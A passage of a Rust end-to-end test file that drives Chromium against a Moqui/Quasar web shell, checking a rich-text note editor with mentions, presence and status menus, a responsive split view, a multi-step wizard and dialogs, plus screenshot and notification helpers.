                let shot = browser.call("Page.captureScreenshot", serde_json::json!({"format": "png"}));
                let bytes = base64::engine::general_purpose::STANDARD
                    .decode(shot["data"].as_str().unwrap())
                    .unwrap();
                std::fs::write(dir.join(format!("tray-{mode}-{width}.png")), bytes).unwrap();
            }
        }
        browser.call("Emulation.clearDeviceMetricsOverride", serde_json::json!({}));
    }
}

/// The record panels and the rich-text editor (IronStone impl-drawers-commons M3), with theme values on DEFAULT_QUASAR that name
/// the gallery's own `Chatter` and `RecordFiles` subscreens as BOSS names its `Shared/` ones: the Detail screen's `chatter` and
/// `record-files` elements load them under the current app root with the record (the shell data says the gallery mounts them),
/// the panel's `m-record-card` asks its card URL and the Log note form is an `m-rich-text` (light): typed text, a word made bold
/// from the toolbar and a mention from the `@` list of the stub mention transition are posted as the editor's HTML, which the
/// note service's `allow-html="safe"` parameter keeps, mention and all. On the Widgets screen the full editor's plain-text
/// toggle turns its HTML into text. With the Tiptap script blocked, the editor is the html editor of `m-text-area`.
#[test]
fn the_record_panels_and_the_rich_text_editor_work_in_chromium() {
    let gate = start_with_data(
        "browser-records",
        r#"<entity-facade-xml type="seed">
            <moqui.screen.ScreenThemeResource screenThemeId="DEFAULT_QUASAR" sequenceNum="910" resourceTypeEnumId="STRT_CHATTER_SCREEN" resourceValue="Chatter"/>
            <moqui.screen.ScreenThemeResource screenThemeId="DEFAULT_QUASAR" sequenceNum="911" resourceTypeEnumId="STRT_RECORD_FILES_SCREEN" resourceValue="RecordFiles"/>
        </entity-facade-xml>"#,
    );
    let base = format!("http://{}", gate.server.address());
    let mut browser = Browser::launch();
    sign_in(&mut browser, &base);
    browser.navigate(&format!("{base}/qapps/gallery/Detail?enumId=STT_INTERNAL_QUASAR"));
    browser.eval(FETCH_SPY);
    // the panels of the current app root, with the record and the element's hint
    browser.wait_for(
        "the Chatter panel",
        "!!document.getElementById('DetailChatter') && document.getElementById('DetailChatter').innerText.indexOf('opens on log') >= 0 \
         && !!document.querySelector('#DetailChatter .m-rich-text[data-state=ready] .ProseMirror')",
        WAIT,
    );
    assert_eq!(
        browser.eval(
            "JSON.stringify(moqui.webrootVue.shellData.apps.find((app) => app.name === 'gallery').recordScreens)"
        ),
        r#"{"chatter":{"url":"/qapps/gallery/Chatter","renderModes":["all"]},"recordFiles":{"url":"/qapps/gallery/RecordFiles","renderModes":["all"]}}"#
    );
    let loaded = fetched(&mut browser, "the Chatter request", "/apps/gallery/Chatter.qvt");
    let url = loaded["url"].as_str().unwrap();
    assert!(
        url.contains("recordEntity=moqui.basic.Enumeration")
            && url.contains("recordId=STT_INTERNAL_QUASAR")
            && url.contains("appRoot=gallery")
            && url.contains("defaultTab=log"),
        "{url}"
    );
    browser.wait_for(
        "the record files panel",
        "!!document.getElementById('DetailFiles') && document.getElementById('DetailFiles').innerText.indexOf('spec-sheet.pdf') >= 0",
        WAIT,
    );
    // the record card of the panel, from its card URL
    browser.wait_for(
        "the record card",
        "(document.querySelector('#DetailChatter .m-record-card') || {innerText: ''}).innerText.indexOf('Active') >= 0",
        WAIT,
    );
    let card = browser.eval("document.querySelector('#DetailChatter .m-record-card').innerText");
    assert!(card.as_str().unwrap().contains("STT_INTERNAL_QUASAR"), "{card}");
    assert!(card.as_str().unwrap().contains("Enumeration"), "{card}");
    assert_clean(&mut browser, "the record panels");

    // the light editor: type, bold a word from the toolbar, mention a user from the @ list, submit
    browser.click(
        "the note editor",
        "document.querySelector('#DetailChatter .ProseMirror')",
    );
    browser.type_text("Hello ");
    browser.click(
        "Bold",
        "document.querySelector('#DetailChatter .m-rich-text [data-command=bold]')",
    );
    browser.type_text("bold");
    browser.click(
        "Bold again",
        "document.querySelector('#DetailChatter .m-rich-text [data-command=bold]')",
    );
    browser.type_text(" team @jo");
    browser.wait_for(
        "the mention list",
        &by_text(".m-rich-text-mentions .q-item", "John Doe"),
        WAIT,
    );
    let searched = fetched(&mut browser, "the mention search", "/mentionSearch");
    assert!(searched["url"].as_str().unwrap().contains("term=jo"), "{searched}");
    browser.click("John Doe", &by_text(".m-rich-text-mentions .q-item", "John Doe"));
    browser.wait_for(
        "the mention in the editor",
        "!!document.querySelector('#DetailChatter .ProseMirror [data-mention-id=EX_JOHN_DOE]') && document.querySelector('.m-rich-text-mentions').offsetParent === null",
        WAIT,
    );
    let html = browser.eval("document.querySelector('#DetailChatter input[type=hidden][name=noteText]').value");
    let html = html.as_str().unwrap().to_string();
    assert!(
        html.starts_with("<p>Hello <strong>bold</strong> team <span data-mention-id=\"EX_JOHN_DOE\">@John Doe</span>"),
        "{html}"
    );
    browser.click("Log", &by_text("#DetailChatter button", "Log"));
    browser.wait_for(
        "the note's message",
        "Array.from(document.querySelectorAll('.q-notification')).some((el) => el.innerText.indexOf('mentioning EX_JOHN_DOE') >= 0)",
        WAIT,
    );
    let posted = fetched(&mut browser, "the note post", "/logNote");
    assert_eq!(posted["status"], 200, "{posted}");
    let sent = posted["sent"]
        .as_array()
        .unwrap()
        .iter()
        .map(|item| item.as_str().unwrap_or_default().to_string())
        .collect::<Vec<_>>();
    assert!(sent.contains(&format!("noteText={html}")), "{sent:?}");
    assert!(sent.contains(&"recordId=STT_INTERNAL_QUASAR".to_string()), "{sent:?}");
    // what the safe cleaning kept: the editor's HTML as it was sent
    let answer: serde_json::Value = serde_json::from_str(posted["body"].as_str().unwrap()).unwrap();
    assert_eq!(answer["noteText"], html.as_str(), "{answer}");
    assert_eq!(answer["mentionIds"], serde_json::json!(["EX_JOHN_DOE"]), "{answer}");
    assert_clean(&mut browser, "the rich-text note");

    // the full editor of the Widgets screen: its toolbar, and the plain-text toggle
    browser.navigate(&format!("{base}/qapps/gallery/Widgets"));
    browser.wait_for(
        "the rich editors",
        "document.querySelectorAll('.m-rich-text[data-state=ready] .ProseMirror').length === 2",
        WAIT,
    );
    assert_eq!(
        browser.eval("Array.from(document.querySelector('.m-rich-text').querySelectorAll('[data-command]')).map((el) => el.dataset.command).join(',')"),
        "bold,italic,strike,bulletList,orderedList,link,image,code,codeBlock,blockquote,undo,redo,plain"
    );
    browser.click(
        "Plain text",
        "document.querySelector('.m-rich-text [data-command=plain]')",
    );
    browser.wait_for(
        "the plain text",
        "!!document.querySelector('.m-rich-text textarea.m-rich-text-plain') && document.querySelector('.m-rich-text textarea.m-rich-text-plain').value.indexOf('Rich text\\n\\nThe Tiptap editor: marks, lists, links (https://tiptap.dev) and code.\\n\\n- Type @ for a mention') === 0",
        WAIT,
    );
    assert_clean(&mut browser, "the full editor");

    if let Some(dir) = std::env::var_os("MOQUI_SHELL_SHOTS") {
        record_shots(&mut browser, &base, std::path::Path::new(&dir));
    }

    // with the Tiptap script blocked, the html editor stands in
    browser.call("Network.enable", serde_json::json!({}));
    browser.call(
        "Network.setBlockedURLs",
        serde_json::json!({"urls": ["*tiptap.min.js*"]}),
    );
    browser.navigate(&format!("{base}/qapps/gallery/Widgets"));
    browser.wait_for(
        "the html editor in place of the rich ones",
        "document.querySelectorAll('.m-rich-text[data-state=failed] .q-editor').length === 2",
        WAIT,
    );
    let problems = browser.take_problems();
    assert!(
        !problems.is_empty()
            && problems
                .iter()
                .all(|problem| format!("{problem:?}").to_lowercase().contains("tiptap")),
        "only the blocked script is reported: {problems:#?}"
    );
}

/// Presence and the account menu's status (IronStone M10, `js/WebrootChat.js`): the heartbeat makes the user online, which the
/// dot of the account avatar and of an avatar with the user's id in a screen (the gallery Chatter) show; the menu sets do not
/// disturb (the dot follows, the page's toasts are off) and a status message; another user's status, set on the server, comes
/// to the page on the userStatus topic because the two share a room.
#[test]
fn the_account_status_and_the_presence_dots_work_in_chromium() {
    let gate = start_with_data(
        "browser-status",
        r#"<entity-facade-xml type="seed">
            <moqui.screen.ScreenThemeResource screenThemeId="DEFAULT_QUASAR" sequenceNum="920" resourceTypeEnumId="STRT_CHATTER_SCREEN" resourceValue="Chatter"/>
            <moqui.security.UserAccount userId="GATE_ADA" username="gate.ada" userFullName="Ada Lovelace"/>
            <moqui.security.UserPreference userId="EX_JOHN_DOE" preferenceKey="CHAT_STATUS_PRESETS"
                preferenceValue="[{&quot;emoji&quot;:&quot;🚀&quot;,&quot;text&quot;:&quot;Shipping&quot;,&quot;clearAfter&quot;:&quot;60&quot;},{&quot;emoji&quot;:&quot;📅&quot;,&quot;text&quot;:&quot;In a meeting&quot;,&quot;clearAfter&quot;:&quot;0&quot;}]"/>
            <moqui.chat.ChatRoom chatRoomId="GATE_DM" roomTypeEnumId="CrtDirect" visibilityEnumId="CrvMembers" directKey="EX_JOHN_DOE,GATE_ADA" lastEventSeq="0"/>
            <moqui.chat.ChatRoomMember chatRoomId="GATE_DM" userId="EX_JOHN_DOE" roleEnumId="CmrMember" lastReadEventSeq="0" notificationLevelEnumId="CnlAll"/>
            <moqui.chat.ChatRoomMember chatRoomId="GATE_DM" userId="GATE_ADA" roleEnumId="CmrMember" lastReadEventSeq="0" notificationLevelEnumId="CnlAll"/>
        </entity-facade-xml>"#,
    );
    let base = format!("http://{}", gate.server.address());
    let mut browser = Browser::launch();
    sign_in(&mut browser, &base);
    browser.navigate(&format!("{base}/qapps/gallery/Detail?enumId=STT_INTERNAL_QUASAR"));
    browser.eval(FETCH_SPY);
    // the heartbeat: online, on the account avatar and on the user's avatar in the Chatter panel
    browser.wait_for(
        "the account avatar's dot",
        "!!document.querySelector('#m-account .m-avatar .m-avatar-presence.m-presence-online')",
        WAIT,
    );
    browser.wait_for(
        "the dot of an avatar with the user's id",
        "!!document.querySelector('#DetailChatter .m-avatar .m-avatar-presence.m-presence-online')",
        WAIT,
    );
    assert_eq!(
        browser.eval("moqui.chat.state.me && moqui.chat.state.me.status"),
        "online"
    );
    assert_clean(&mut browser, "presence");

    // the account menu: the status, then do not disturb
    browser.click("the account menu", "document.getElementById('m-account')");
    browser.wait_for(
        "the status in the account menu",
        "!!document.getElementById('m-status-current') && document.getElementById('m-status-current').innerText.indexOf('Online') >= 0",
        WAIT,
    );
    assert_eq!(
        browser.eval("Array.from(document.querySelectorAll('.m-user-status [data-status]')).map((el) => el.dataset.status).join(',')"),
        "online,away,dnd,invisible,message"
    );
    browser.click(
        "Do not disturb",
        "document.querySelector('.m-user-status [data-status=dnd]')",
    );
    let set = fetched(&mut browser, "the status post", "/setUserStatus");
    assert_eq!(set["status"], 200, "{set}");
    let answer: serde_json::Value = serde_json::from_str(set["body"].as_str().unwrap()).unwrap();
    assert_eq!(answer["myStatus"]["status"], "dnd", "{set}");
    assert_eq!(answer["myStatus"]["presence"], "dnd", "{set}");
    browser.wait_for(
        "the do-not-disturb dot",
        "!!document.querySelector('#m-account .m-avatar-presence.m-presence-dnd') \
         && !!document.querySelector('#DetailChatter .m-avatar .m-avatar-presence.m-presence-dnd')",
        WAIT,
    );
    assert_eq!(
        browser.eval("moqui.chat.quiet() && moqui.webrootVue.notificationClient.displayEnable === false"),
        true
    );

    // a status message, kept until it is cleared
    browser.click("the account menu", "document.getElementById('m-account')");
    browser.wait_for(
        "the status message item",
        "!!document.querySelector('.m-user-status [data-status=message]') && document.querySelector('.m-user-status [data-status=message]').offsetParent !== null",
        WAIT,
    );
    browser.click(
        "Set a status message",
        "document.querySelector('.m-user-status [data-status=message]')",
    );
    browser.wait_for(
        "the status dialog",
        "!!document.querySelector('.q-dialog input[name=statusText]')",
        WAIT,
    );
    // the user's presets (the CHAT_STATUS_PRESETS preference), not the defaults; one fills the dialog
    assert_eq!(
        browser.eval("Array.from(document.querySelectorAll('.q-dialog [data-preset]')).map((el) => el.innerText.replace(/\\s+/g, ' ').trim()).join('|')"),
        "🚀 Shipping 1 hour|📅 In a meeting"
    );
    browser.click(
        "the In a meeting preset",
        "document.querySelector('.q-dialog [data-preset=\"1\"]')",
    );
    browser.wait_for(
        "the preset in the dialog",
        "document.querySelector('.q-dialog input[name=statusText]').value === 'In a meeting' && document.querySelector('.q-dialog input[name=emoji]').value === '📅'",
        WAIT,
    );
    browser.click("Save", "document.getElementById('m-status-save')");
    browser.wait_for(
        "the saved status message",
        "moqui.chat.state.me && moqui.chat.state.me.statusText === 'In a meeting' && moqui.chat.state.me.emoji === '📅' && !document.querySelector('.q-dialog input[name=statusText]')",
        WAIT,
    );
    browser.click("the account menu", "document.getElementById('m-account')");
    browser.wait_for(
        "the status message in the menu",
        "!!document.querySelector('#m-status-current .m-status-text') && document.querySelector('#m-status-current .m-status-text').innerText.indexOf('In a meeting') >= 0 \
         && document.getElementById('m-status-current').innerText.indexOf('Do not disturb') >= 0",
        WAIT,
    );
    {
        use moqui_lib::object::Value;
        let factory = gate.server.factory();
        let ctx = factory.new_context();
        let entered = ctx.enter();
        let authz = ctx.disable_authz();
        let row = factory
            .entity()
            .unwrap()
            .find("moqui.security.UserStatus")
            .unwrap()
            .eq("userId", Value::string("EX_JOHN_DOE"))
            .one()
            .unwrap()
            .unwrap();
        assert_eq!(row.get("statusEnumId").and_then(Value::as_str), Some("UpsDnd"));
        assert_eq!(row.get("statusText").and_then(Value::as_str), Some("In a meeting"));
        drop(authz);
        drop(entered);
    }
    browser.press("Escape");

    // another user's status: Ada, in a direct room with John, comes online and busy; the page hears it on userStatus
    let deadline = std::time::Instant::now() + WAIT;
    let mut shown = false;
    while !shown && std::time::Instant::now() < deadline {
        let factory = gate.server.factory();
        let ctx = factory.new_context();
        let entered = ctx.enter();
        {
            let _authz = ctx.disable_authz();
            moqui_core::user::internal_login_user("gate.ada").unwrap();
        }
        let call = |name: &str, parameters: &[(&str, moqui_lib::object::Value)]| {
            let parameters = parameters
                .iter()
                .map(|(key, value)| ((*key).to_string(), value.clone()))
                .collect();
            moqui_core::service::sync(&format!("org.moqui.impl.ChatServices.{name}"), &parameters)
                .unwrap_or_else(|err| panic!("{name}: {err}"))
        };
        let authz = ctx.disable_authz();
        call(
            "heartbeat#UserStatus",
            &[("idleSeconds", moqui_lib::object::Value::I64(0))],
        );
        call(
            "set#UserStatus",
            &[
                ("status", moqui_lib::object::Value::string("dnd")),
                ("statusText", moqui_lib::object::Value::string("Writing")),
            ],
        );
        drop(authz);
        drop(entered);
        let until = std::time::Instant::now() + Duration::from_millis(750);
        while std::time::Instant::now() < until {
            browser.pump(Duration::from_millis(100));
            if browser.try_eval("moqui.chat.presenceOf('GATE_ADA') === 'dnd' && moqui.chat.statusOf('GATE_ADA').statusText === 'Writing'")
                .is_ok_and(|value| value == serde_json::Value::Bool(true))
            {
                shown = true;
                break;
            }
        }
    }
    assert!(shown, "the page did not hear Ada's status");
    assert_clean(&mut browser, "the account status");
}

/// The gallery Split: a container-split side by side at 1280 px (the side at its width, both panes shown), stacked at 390 px with the
/// list alone, a country chosen showing it with the back button, and back to the list. The gallery Wizard: Next with an empty
/// customer name stays with the error by the field, Next with a name goes to Options with the step in the URL, Back keeps the
/// draft, and Create customer on the review goes back to the first step.
#[test]
fn the_split_stacks_and_the_wizard_steps_in_chromium() {
    let gate = start("browser-layout");
    let base = format!("http://{}", gate.server.address());
    let mut browser = Browser::launch();
    sign_in(&mut browser, &base);
    let metrics = |browser: &mut Browser, width: i64, height: i64| {
        browser.call(
            "Emulation.setDeviceMetricsOverride",
            serde_json::json!({"width": width, "height": height, "deviceScaleFactor": 1, "mobile": width < 600}),
        );
    };
    let shown = |selector: &str| {
        format!(
            "(() => {{ const el = document.querySelector({selector:?}); return !!el && el.offsetParent !== null; }})()"
        )
    };

    metrics(&mut browser, 1280, 900);
    browser.navigate(&format!("{base}/qapps/gallery/Split"));
    browser.wait_for(
        "the split side by side",
        "!!document.querySelector('#CountrySplit .q-splitter') && document.getElementById('CountrySplit').dataset.stacked === 'false' \
         && document.querySelector('#CountrySplit .m-split-main').innerText.indexOf('States and regions') >= 0",
        WAIT,
    );
    let side = browser
        .eval("Math.round(document.querySelector('#CountrySplit .q-splitter__before').getBoundingClientRect().width)");
    assert_eq!(side, 320, "the side at its width");
    assert_eq!(browser.eval(&shown("#CountrySplit .m-split-side")), true);
    assert_eq!(
        browser.eval("!!document.querySelector('#CountrySplit .m-split-back')"),
        false
    );
    assert_clean(&mut browser, "the split side by side");

    metrics(&mut browser, 390, 844);
    browser.navigate(&format!("{base}/qapps/gallery/Split"));
    browser.wait_for(
        "the split stacked with the list alone",
        "!!document.getElementById('CountrySplit') && document.getElementById('CountrySplit').dataset.stacked === 'true' \
         && document.querySelector('#CountrySplit .m-split-side').offsetParent !== null \
         && document.querySelector('#CountrySplit .m-split-main').offsetParent === null",
        WAIT,
    );
    assert!(
        browser
            .eval("document.documentElement.scrollWidth <= window.innerWidth + 1")
            .as_bool()
            .unwrap(),
        "no horizontal scroll of the page at 390 px"
    );
    browser.click(
        "a country",
        &by_text(
            "#CountrySplit .m-split-side a, #CountrySplit .m-split-side button",
            "Albania",
        ),
    );
    browser.wait_for(
        "the country alone with the back button",
        "location.search.indexOf('geoId=ALB') >= 0 && document.querySelector('#CountrySplit .m-split-side').offsetParent === null \
         && document.querySelector('#CountrySplit .m-split-main').offsetParent !== null \
         && document.querySelector('#CountrySplit .m-split-main').innerText.indexOf('Albania') >= 0 && !!document.querySelector('#CountrySplit .m-split-back')",
        WAIT,
    );
    browser.click("back", "document.querySelector('#CountrySplit .m-split-back')");
    browser.wait_for(
        "the list again",
        "location.search.indexOf('geoId=') < 0 && document.querySelector('#CountrySplit .m-split-side').offsetParent !== null",
        WAIT,
    );
    assert_clean(&mut browser, "the split stacked");
    browser.call("Emulation.clearDeviceMetricsOverride", serde_json::json!({}));

    browser.navigate(&format!("{base}/qapps/gallery/Wizard"));
    browser.eval(FETCH_SPY);
    browser.wait_for(
        "the wizard on its first step",
        "!!document.querySelector('#CustomerWizard .q-stepper') && document.querySelectorAll('#CustomerWizard .q-stepper__tab').length === 3 \
         && !!document.querySelector('#CustomerWizard [name=customerName]')",
        WAIT,
    );
    assert_eq!(
        browser.eval("Array.from(document.querySelectorAll('#CustomerWizard .q-stepper__tab')).map((el) => el.innerText.trim().split('\\n').pop()).join(',')"),
        "Customer,Options,Review"
    );
    assert_eq!(
        browser.eval("!!document.querySelector('#CustomerWizard .m-wizard-back')"),
        false
    );
    // an empty name: the error by the field, and the wizard stays
    browser.eval(
        "(() => { const input = document.querySelector('#CustomerWizard [name=customerName]'); input.focus(); input.select(); return true; })()",
    );
    browser.press("Delete");
    browser.eval(
        "(() => { const input = document.querySelector('#CustomerWizard [name=customerName]'); input.value = ''; input.dispatchEvent(new Event('input', {bubbles: true})); return true; })()",
    );
    browser.click("Next", "document.querySelector('#CustomerWizard .m-wizard-next')");
    browser.wait_for(
        "the error by the name",
        "(document.querySelector('#CustomerWizard .q-field--error') || {innerText: ''}).innerText.indexOf('Enter the customer name') >= 0",
        WAIT,
    );
    let answer = fetched(&mut browser, "the step post", "/saveCustomer");
    assert_eq!(answer["status"], 500, "{answer}");
    assert_eq!(
        browser.eval("/\\/gallery\\/Wizard(\\/Customer)?$/.test(location.pathname)"),
        true,
        "still on the first step"
    );
    let problems = browser.take_problems();
    assert!(
        problems.iter().all(|problem| format!("{problem:?}").contains("500")),
        "only the 500 of the answer: {problems:#?}"
    );
    // a name: Next goes to Options, the step in the URL
    browser.click(
        "the name",
        "document.querySelector('#CustomerWizard [name=customerName]')",
    );
    browser.type_text("Gate Customer");
    browser.click("Next", "document.querySelector('#CustomerWizard .m-wizard-next')");
    browser.wait_for(
        "the second step",
        "location.pathname.endsWith('/gallery/Wizard/Options') && !!document.querySelector('#CustomerWizard [name=countryGeoId]') \
         && !!document.querySelector('#CustomerWizard .m-wizard-back')",
        WAIT,
    );
    assert_eq!(
        browser.eval("document.querySelectorAll('#CustomerWizard .q-stepper__tab--done').length"),
        1,
        "the first step is done"
    );
    // Back keeps what the step saved
    browser.click("Back", "document.querySelector('#CustomerWizard .m-wizard-back')");
    browser.wait_for(
        "the first step with its draft",
        "location.pathname.endsWith('/gallery/Wizard/Customer') && (document.querySelector('#CustomerWizard [name=customerName]') || {value: ''}).value === 'Gate Customer'",
        WAIT,
    );
    browser.click("Next", "document.querySelector('#CustomerWizard .m-wizard-next')");
    browser.wait_for("Options again", "location.pathname.endsWith('/gallery/Wizard/Options') && !!document.querySelector('#CustomerWizard [name=countryGeoId]')", WAIT);
    browser.click("Next", "document.querySelector('#CustomerWizard .m-wizard-next')");
    browser.wait_for(
        "the review",
        "location.pathname.endsWith('/gallery/Wizard/Review') && document.querySelector('#CustomerWizard .m-wizard-body').innerText.indexOf('Gate Customer') >= 0",
        WAIT,
    );
    let options = fetched(&mut browser, "the options post", "/saveOptions");
    assert_eq!(options["status"], 200, "{options}");
    assert_eq!(
        browser.eval("document.querySelector('#CustomerWizard .m-wizard-next .block').innerText.trim()"),
        "Create customer"
    );
    browser.click(
        "Create customer",
        "document.querySelector('#CustomerWizard .m-wizard-next')",
    );
    browser.wait_for(
        "back on the first step with the message",
        "location.pathname.endsWith('/gallery/Wizard/Customer') && Array.from(document.querySelectorAll('.q-notification')).some((el) => el.innerText.indexOf('Gate Customer created') >= 0)",
        WAIT,
    );
    assert_clean(&mut browser, "the wizard");
}

/// The gallery Dialog: the New container-dialog registers as a container of the root by its id, so the form in it, with
/// `background-hide-id="NewEnumDialog"`, closes it once its background submit is answered; the page stays the list.
#[test]
fn a_background_submit_closes_the_container_dialog_it_names_in_chromium() {
    let gate = start("browser-dialog");
    let base = format!("http://{}", gate.server.address());
    let mut browser = Browser::launch();
    sign_in(&mut browser, &base);
    browser.navigate(&format!("{base}/qapps/gallery/Dialog"));
    browser.eval(FETCH_SPY);
    browser.wait_for(
        "the list with its New dialog registered",
        "!!moqui.webrootVue && !!moqui.webrootVue.activeContainers.NewEnumDialog && document.body.innerText.indexOf('Comparison operators') >= 0",
        WAIT,
    );
    // the submit asks first (data-confirm); the test answers yes
    browser.eval("(() => { window.confirm = () => true; return true; })()");
    browser.click("New", &by_text("button", "New"));
    browser.wait_for(
        "the dialog open",
        "!!document.querySelector('.q-dialog [name=enumId]') && document.querySelector('.q-dialog').innerText.indexOf('New enumeration') >= 0",
        WAIT,
    );
    browser.click("the id", "document.querySelector('.q-dialog [name=enumId]')");
    browser.type_text("GATE_DLG");
    browser.click("Create", &by_text(".q-dialog button", "Create"));
    let answer = fetched(&mut browser, "the create post", "/createEnum");
    assert_eq!(answer["status"], 200, "{answer}");
    browser.wait_for(
        "the dialog closed by its id",
        "!document.querySelector('.q-dialog [name=enumId]') && location.pathname.endsWith('/gallery/Dialog')",
        WAIT,
    );
    assert_eq!(
        browser.eval("document.body.innerText.indexOf('Comparison operators') >= 0"),
        true,
        "the list is still the page"
    );
    // opened again, the root's hideContainer by its id closes it too
    browser.click("New", &by_text("button", "New"));
    browser.wait_for(
        "the dialog open again",
        "!!document.querySelector('.q-dialog [name=enumId]')",
        WAIT,
    );
    browser.eval("(() => { moqui.webrootVue.hideContainer('NewEnumDialog'); return true; })()");
    browser.wait_for(
        "the dialog closed by hideContainer",
        "!document.querySelector('.q-dialog [name=enumId]')",
        WAIT,
    );
    assert_clean(&mut browser, "the gallery Dialog");
}

/// The Detail screen's Chatter column with the @ list of the note editor open, and the rich editors of the Widgets screen, light
/// and dark, 1280 and 390 px wide, as PNGs in `dir`.
fn record_shots(browser: &mut Browser, base: &str, dir: &std::path::Path) {
    use base64::Engine as _;
    std::fs::create_dir_all(dir).unwrap();
    let save = |browser: &mut Browser, name: &str| {
        browser.pump(Duration::from_millis(500));
        let shot = browser.call("Page.captureScreenshot", serde_json::json!({"format": "png"}));
        let bytes = base64::engine::general_purpose::STANDARD
            .decode(shot["data"].as_str().unwrap())
            .unwrap();
        std::fs::write(dir.join(name), bytes).unwrap();
    };
    for (width, height) in [(1280, 900), (390, 844)] {
        browser.call(
            "Emulation.setDeviceMetricsOverride",
            serde_json::json!({"width": width, "height": height, "deviceScaleFactor": 1, "mobile": width < 600}),
        );
        for dark in [false, true] {
            let mode = if dark { "dark" } else { "light" };
            browser.navigate(&format!("{base}/qapps/gallery/Detail?enumId=STT_INTERNAL_QUASAR"));
            browser.wait_for(
                "the Chatter panel",
                "!!document.querySelector('#DetailChatter .m-rich-text[data-state=ready] .ProseMirror') \
                 && (document.querySelector('#DetailChatter .m-record-card') || {innerText: ''}).innerText.indexOf('Active') >= 0",
                WAIT,
            );
            browser.eval(&format!("moqui.webrootVue.$q.dark.set({dark}), true"));
            browser.click(
                "the note editor",
                "document.querySelector('#DetailChatter .ProseMirror')",
            );
            browser.type_text("Reviewed with @jo");
            browser.wait_for(
                "the mention list",
                &by_text(".m-rich-text-mentions .q-item", "John Doe"),
                WAIT,
            );
            browser.eval("document.getElementById('DetailChatter').scrollIntoView({block: 'start'}), true");
            save(browser, &format!("chatter-{mode}-{width}.png"));
            browser.press("Escape");
            browser.navigate(&format!("{base}/qapps/gallery/Widgets"));
            browser.wait_for(
                "the rich editors",
                "document.querySelectorAll('.m-rich-text[data-state=ready] .ProseMirror').length === 2",
                WAIT,
            );
            browser.eval(&format!(
                "moqui.webrootVue.$q.dark.set({dark}), document.querySelector('.m-rich-text').scrollIntoView({{block: 'start'}}), true"
            ));
            save(browser, &format!("rich-text-{mode}-{width}.png"));
        }
    }
    browser.call("Emulation.clearDeviceMetricsOverride", serde_json::json!({}));
    browser.eval("moqui.webrootVue.$q.dark.set(false), true");
}

/// The header with the palette open and with the `+` menu open, light and dark, 1280 and 390 px wide, as PNGs in `dir`.
fn shell_shots(browser: &mut Browser, page: &str, dir: &std::path::Path) {
    use base64::Engine as _;
    std::fs::create_dir_all(dir).unwrap();
    let save = |browser: &mut Browser, name: &str| {
        browser.pump(Duration::from_millis(500));
        let shot = browser.call("Page.captureScreenshot", serde_json::json!({"format": "png"}));
        let bytes = base64::engine::general_purpose::STANDARD
            .decode(shot["data"].as_str().unwrap())
            .unwrap();
        std::fs::write(dir.join(name), bytes).unwrap();
    };
    for (width, height) in [(1280, 900), (390, 844)] {
        browser.call(
            "Emulation.setDeviceMetricsOverride",
            serde_json::json!({"width": width, "height": height, "deviceScaleFactor": 1, "mobile": width < 600}),
        );
        browser.navigate(page);
        browser.wait_for(
            "the shell data",
            "!!(window.moqui && moqui.webrootVue && moqui.webrootVue.shellData && moqui.webrootVue.screenRecord)",
            WAIT,
        );
        for dark in [false, true] {
            let mode = if dark { "dark" } else { "light" };
            browser.eval(&format!("moqui.webrootVue.$q.dark.set({dark}), true"));
            ctrl_k(browser);
            browser.wait_for(
                "the palette",
                "document.activeElement && document.activeElement.id === 'm-palette-input'",
                WAIT,
            );
            browser.type_text("gallery");
            palette_row(browser, "the gallery screens", "Gallery");
            browser.wait_for(
                "the palette search",
                "Array.from(document.querySelectorAll('#m-palette .q-item__label--header')).some((el) => el.innerText.indexOf('Enumerations') >= 0) \
                 || !document.querySelector('#m-palette .q-spinner')",
                WAIT,
            );
            save(browser, &format!("palette-{mode}-{width}.png"));
            browser.press("Escape");
            browser.wait_for("the palette closed", "!document.getElementById('m-palette')", WAIT);
            browser.click("the + menu", "document.getElementById('m-quick-create-menu')");
            browser.wait_for("the + menu open", "!!document.querySelector('.q-menu')", WAIT);
            save(browser, &format!("quick-create-{mode}-{width}.png"));
            browser.press("Escape");
            browser.wait_for("the + menu closed", "!document.querySelector('.q-menu')", WAIT);
        }
    }
    browser.call("Emulation.clearDeviceMetricsOverride", serde_json::json!({}));
    // dark mode was set on the page only, not saved as the user's preference
    browser.eval("moqui.webrootVue.$q.dark.set(false), true");
}

/// The user id of a seeded user.
fn user_id_of(gate: &common::Gate, username: &str) -> String {
    use moqui_lib::object::Value;
    let factory = gate.server.factory();
    let ctx = factory.new_context();
    let entered = ctx.enter();
    let authz = ctx.disable_authz();
    let row = factory
        .entity()
        .unwrap()
        .find("moqui.security.UserAccount")
        .unwrap()
        .eq("username", Value::string(username))
        .one()
        .unwrap()
        .unwrap();
    let user_id = row.get("userId").and_then(Value::as_str).unwrap_or("").to_string();
    drop(authz);
    drop(entered);
    user_id
}

/// Send a notification to the user through the core API until the page shows it: the socket's subscription is applied on the
/// service pool after it opens, so the first sends can come before it. Returns the shown text.
fn notify_until_shown(browser: &mut Browser, gate: &common::Gate, user_id: &str, label: &str, shown: &str) -> String {
    let deadline = std::time::Instant::now() + WAIT;
    let mut sent = 0;
    while std::time::Instant::now() < deadline {
        sent += 1;
        let factory = gate.server.factory();
        let ctx = factory.new_context();
        let entered = ctx.enter();
        let authz = ctx.disable_authz();
        let mut note = moqui_core::notify::NotificationMessage::new();
        note.topic("GateNotify")
            .user_id(user_id)
            .title(format!("Gate note {label} {sent}"))
            .link("/qapps/System")
            .notification_type("success")
            .show_alert(true)
            .persist(false)
            .message_json("{\"n\":1}")
            .send()
            .unwrap();
        drop(authz);
        drop(entered);
        let until = std::time::Instant::now() + Duration::from_millis(750);
        while std::time::Instant::now() < until {
            browser.pump(Duration::from_millis(100));
            if let Ok(serde_json::Value::String(text)) = browser.try_eval(shown) {
                return text;
            }
        }
    }
    panic!("the {label} page did not show a notification after {sent} sends");
}

/// The authorization row the qvt tests change: its action from the database.
fn authz_action(gate: &common::Gate) -> String {
    use moqui_lib::object::Value;
    let factory = gate.server.factory();
    let ctx = factory.new_context();
    let entered = ctx.enter();
    let authz = ctx.disable_authz();
    let row = factory
        .entity()
        .unwrap()
        .find("moqui.security.ArtifactAuthz")
        .unwrap()
        .eq("artifactAuthzId", Value::string("SYSTEM_APP_ALL"))
        .one()
        .unwrap()
        .unwrap();
    let action = row
        .get("authzActionEnumId")
        .and_then(Value::as_str)
        .unwrap_or("")
        .to_string();
    drop(authz);
    drop(entered);
    action
}

/// The fixture through the `/qapps` shell (server-merged, or server-static when the gate marks it): the shell mounts, the screen renders, a
/// Quasar menu chooses a value, a dialog opens and closes, and a row's m-form posts with the session token.
